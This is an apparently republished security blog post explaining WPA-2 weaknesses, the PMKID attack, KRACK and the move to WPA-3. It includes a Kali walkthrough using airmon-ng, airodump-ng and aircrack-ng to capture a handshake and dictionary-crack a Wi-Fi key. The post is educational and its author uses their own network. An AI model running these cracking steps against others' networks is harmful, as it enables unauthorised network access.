
# The Beginning of the End of WPA-2 — Cracking WPA-2 Just Got a Whole Lot Easier

It has been known for a while that WPA-2 (802.11i) has some fundamental security problems, and that these have thus led to the creation of WPA-3. A core problem is around the 4-way handshake, and here is me cracking WPA-2 by listening to the handshake with just a Raspberry PI and a $10 wi-fi transceiver:

<center><iframe width="560" height="315" src="https://www.youtube.com/embed/xPNONGc7MmU" frameborder="0" allowfullscreen></iframe></center>

For this I needed to capture the communication of the 4-way handshake, and then crack a PBKDF2-SHA1 hashed value. If a weak password is used, it is normally fairly inexpensive to crack the hash and gain access to the network.

As PBKDF2 is a slow hashing method, it will be costly to crack fairly complex passwords with brute force. Typically when using Hashcat, we focus on a range of rules which considerably improves the chances of success, such placing a digit at the end or making the first character an upper case one.

But recently things got even easier, as a Hashcat developer — Jens “Atom” Steube —who has found a way to crack the network **without the involvement of the 4-way handshake**. With this an attacker sends a single EAPOL frame to the access point. They then get back the PMK (Pairwise Master Key) and use Hashcat to generate the Pre-Shared Key (PSK). With a reasonably priced GPU cracking infrastructure, many systems could now be cracked in just a few days.

There is thus no need to capture the four-way handshake and to make an association request with the access point. It has been known for a while that WPA-2 (802.11i) has security weaknesses, and that the latest one is likely to increase the drive towards the adoption of WPA-3 (‘dragonfly’). With WPA-3 a new handshaking methods is being rolled-out, and which should prevent the cracking of weak passwords.

But, remember, too, that enterprise level systems — using WPA-Enterprise — are a great deal more difficult to crack than home devices (as they use a back-end authentication system, such as with a RADIUS server). So, if you’re a company, don’t go out and implement WPA-3 on your systems as your authentication infrastructure saves you here.

If you have a home-based router — using WPA-Personal — then the device may be vulnerable if you use a simple password.

A basic demo of the WPA-2 process is [here](https://asecuritysite.com/encryption/ssid_hm).

### WPA-2 Hash Cracking Background

If you are interested, here’s a bit of background using the old method of cracking WPA-2. I have used a R-PI with Linux Kali, just to show that the vulnerability can exploited with low-specification equipment.

Within WPA-2 we aim to create an initial pairing between the client and the access point, and then to identify them without giving away the password which has been used. In the initial authentication process, the client will either use pre-shared key (PSK), or use an EAP exchange through 802.1X (EAPOL).

The EAPOL exchange requires the usage of an authentication server. After this phase a shared secret key is created, and is known as the Pairwise Master Key (PMK). This uses PBKDF2-SHA1 as a hashing method, as the PBKDF2 part makes difficult to crack the hash (as there are a number of rounds used to slow down the hashing process). Within PSK, the PSK is defined with the PMK, but within EAPOL, the PMK is derived from EAP parameters. Generally EAPOL is more difficult to crack than using PSK. The PMK is generated from the PSK with:

    PMK = PBKDF2(HMAC−SHA1, PSK, SSID, 4096, 256)

and where we use the SHA1 hashing function with HMAC as the message authentication code. In this case the PMK is generated from 4096 iterations of the hashing method and creates a 256-bit PMK (which is 64 hexadecimal characters and where each hexadecimal character represents 4 bits). A simple Python script to generate the PMK is:

    from pbkdf2 import PBKDF2
    ssid = 'home' 
    phrase = 'qwerty123'
    print "SSID: "+ssid
    print "Pass phrase: "+phrase
    print "Pairwise Master Key: " + PBKDF2(phrase, ssid, 4096).read(32).encode("hex"))

and a sample run is [[here](https://asecuritysite.com/encryption/ssid_hm)]:

    SSID: home
    Pass phrase: qwerty123
    Pairwise Master Key: bbaf585c301dc4d4024523535f42baf04630f852e2b01979ec0401edcdf
    0e9c8

Thus, for an SSID of “home”, and a pass phrase of “qwerty123” we generate a 256-bit PMK of “bbaf585c301dc4d4024523535f42baf04630f852 e2b01979ec0401edcdf0e9c8”.

### The four-way handshake

Within WPA-2 (802.11i) we get the four-way handshake process, and which is illustrated in Figure 1. It is designed so that the access point and wireless client can prove that they know each other by showing that the know the PSK/PMK, without ever releasing the key. They must the encrypt messages to each other, and if they can decrypt them, then they have successfully authenticated each other. In this way we can protect against a malicious spoof access point which is broadcasting the valid looking SSID.

![Figure 1: 802.11i Four-way handshake for authentication](https://cdn-images-1.medium.com/max/2000/1*CS6xocXSnwsgFUnuXnhMAQ.png)*Figure 1: 802.11i Four-way handshake for authentication*

Overall the PMK will last for the complete authentication of the devices, and should be used sparingly. Thus the four-way handshake uses a derive key known as the Pairwise Transient Key (PTK), and which is generated from the PMK, a client nonce (ANonce), an access point nonce (SNonce), and the MAC addresses of the client and the access point (AP). These are then put into a pseudo random function, and generate a GTK (Group Temporal Key). The GTK is then used to decrypt multicast and broadcast traffic.

The details of the handshake are thus:

* AP sends a nonce to the STA (ANonce). The client creates the PTK.

* Client nonce (SNonce) to AP and a Message Integrity Code (MIC), and which includes the authentication.

* The AP creates PTK and sends the GTK, along with a sequence number together and an MIC.

* The client sends a confirmation to the AP.

A demo of the cracking of WPA-2 is:

<center><iframe width="560" height="315" src="https://www.youtube.com/embed/xPNONGc7MmU" frameborder="0" allowfullscreen></iframe></center>

The following shows the setup:

![](https://cdn-images-1.medium.com/max/4000/0*idLsP9HoPI1GlIAN.jpeg)

And test with airmon-ng:

    root@kali:~  airmon-ng

    PHY	Interface	Driver		Chipset

    null	wlan0		??????		Realtek Semiconductor Corp. RTL8188CUS 802.11n WLAN Adapter
    phy0	wlan1		??????		Broadcom 43430
    phy1	wlan2		rt2800usb	Ralink Technology, Corp. RT2870/RT3070

    root@kali:~  airmon-ng start wlan2

    Found 4 processes that could cause trouble.
    If airodump-ng, aireplay-ng or airtun-ng stops working after
    a short period of time, you may want to run 'airmon-ng check kill'

    PID Name
      175 NetworkManager
      363 wpa_supplicant
      491 dhclient
      609 dhclient

    PHY	Interface	Driver		Chipset

    null	wlan0		??????		Realtek Semiconductor Corp. RTL8188CUS 802.11n WLAN Adapter
    phy0	wlan1		??????		Broadcom 43430
    phy1	wlan2		rt2800usb	Ralink Technology, Corp. RT2870/RT3070

    (mac80211 monitor mode vif enabled for [phy1]wlan2 on [phy1]wlan2mon)
    		(mac80211 station mode vif disabled for [phy1]wlan2)

We can see we are now monitoring on wlan2mon, and to test:

    root@kali:~  airodump-ng wlan2mon

    CH  5 ][ Elapsed: 1 min ][ 2017-02-19 12:10                                   
                                                                                   
     BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                   
     XX:FC:AF:XX:XX:XX  -44       39      893   24   1  22e  WPA              ZZZZZ
     XX:A1:XX:XX:XX:XX  -49       34        0    0  11  54e  WPA2 CCMP   PSK  ZZZZZ
     XX:D3:XX:XX:XX:XX  -65       46        0    0   6  54e  WPA2 CCMP   PSK  ZZZZZ
     XX:21:XX:XX:XX:XX  -90        3        1    0  13  54e  WPA2 CCMP   PSK  ZZZZZ
                                                                                    
     BSSID              STATION            PWR   Rate    Lost    Frames  Probe      
                                                                                    
     (not associated)   XX:XX:XX:XX:XX:XX  -44    0 - 1      0       10  ZZZZZ   
     XX:XX:XX:XX:XX:XX  XX:XX:XX:XX:XX:XX   -1    0e- 0      0       46             
     XX:XX:XX:XX:XX:XX  XX:XX:XX:2B:XX:XX  -20    0e- 0e     0      836

We can now grab the four way handshake with:

    airodump-ng -c 1 --bssid  XX:FC:AF:XX:XX:XX -w psk wlan2mon

This reads for the required BSSID on Channel 1, and will create a file which begins with psk, and has a .cap extension.

The output here is:

    CH  1 ][ Elapsed: 18 s ][ 2017-02-19 21:38 ][ WPA handshake: XX:FC:AF:XX:XX:XX       
                                                                                           
     BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                           
     XX:FC:AF:XX:XX:XX  -30   0      215     3077   90   1  54e  WPA2 CCMP   PSK  ZZZZZ  
                                                                                           
     BSSID              STATION            PWR   Rate    Lost    Frames  Probe             
                                                                                           
     XX:FC:AF:XX:XX:XX  XX:XX:XX:XX:XX:XX    3  -22    0e- 1e     0     2569

Next we create a list of passwords in password.lst.

We can then analyse the cap files with:

    aircrack-ng -w password.lst -b  XX:FC:AF:XX:XX:XX psk*.cap

This gives the results of (where some details have been removed):

    Aircrack-ng 1.2 rc4

    [00:00:00] 2/1 keys tested (28.31 k/s)

    Time left: 0 seconds                                     200.00%

    KEY FOUND! [ ------- ]

    Master Key     : 5C ------------------- 0C 
                           3A ------------------- 53

    Transient Key  : 6A ------------------- EB 
                           4D ------------------- 72 
                           7A ------------------- 87 
                           80 ------------------- 21

    EAPOL HMAC     : C0 ------------------- 95

### KRACK Vulnerability

On 16 October 2017, the weakness of the four-way handshake was also highlighted with KRACK (Key Reinstallation Attacks) [[paper](https://papers.mathyvanhoef.com/ccs2017.pdf)]:
> US-CERT has become aware of several key management vulnerabilities in the 4-way handshake of the Wi-Fi Protected Access II (WPA2) security protocol. The impact of exploiting these vulnerabilities includes decryption, packet replay, TCP connection hijacking, HTTP content injection, and others. Note that as protocol-level issues, most or all correct implementations of the standard will be affected. The CERT/CC and the reporting researcher KU Leuven, will be publicly disclosing these vulnerabilities on 16 October 2017.

Within the four-way handshake, in the third step, the protocol allows for the key to be sent many times. On resending, the nonce is reused, and which compromises the handshaking, and cracks the crypto.

The code is now available [here](https://github.com/vanhoefm/krackattacks/blob/gh-pages/index.html), and are defined in CVE-2017–13077, CVE-2017–13078, CVE-2017–13079, CVE-2017–13080, CVE-2017–13081, CVE-2017–13082, CVE-2017–13084, CVE-2017–13086, CVE-2017–13087, CVE-2017–13088. Here is the vulnerability in full:

<center><iframe width="560" height="315" src="https://www.youtube.com/embed/Oh4WURZoR98" frameborder="0" allowfullscreen></iframe></center>

### Conclusions

WEP [[here](https://medium.com/@billbuchanan_27654/a-blast-from-the-past-wep-one-of-the-poorest-wi-fi-standards-ever-6e6622bc3181)] was deeply flawed and we fixed a few things with WPA (such as upgrading from RC4 to TKIP). WPA-2 (802.11i), though, was much better, and had improved encryption methods (RC4 to AES), longer encryption keys, longer salt values (defined as Initialisation Vectors), and improved authentication methods. But WPA-2 has security concerns, especially with the advent of GPU clusters, and shouldn’t be fully trusted for weak passwords.

New vulnerabilities, too, such as KRACK [[here](https://www.linkedin.com/pulse/krack-critical-wpa-2-flaw-prof-bill-buchanan-obe-phd-fbcs/)], have also exposed weaknesses in WPA-2. The path of migration is towards WPA-3, but this will take a while to be adopted. Unfortunately the Wi-Fi Alliance has not make WPA-3 mandatory for new equipment.

Overall, WPA-3 replaces the four-way handshake with a more secure version (‘dragonfly’) — named Simultaneous Authentication of Equals (SAE) and based on the handshaking method using in IEEE 802.11s — and which removes the PSK. This should stop dictionary attacks on weak passwords, and better protect home users.

Note: All of my demos are done on my own hardware and my own private network. Do not use these tools without the permission of those who may be affected.
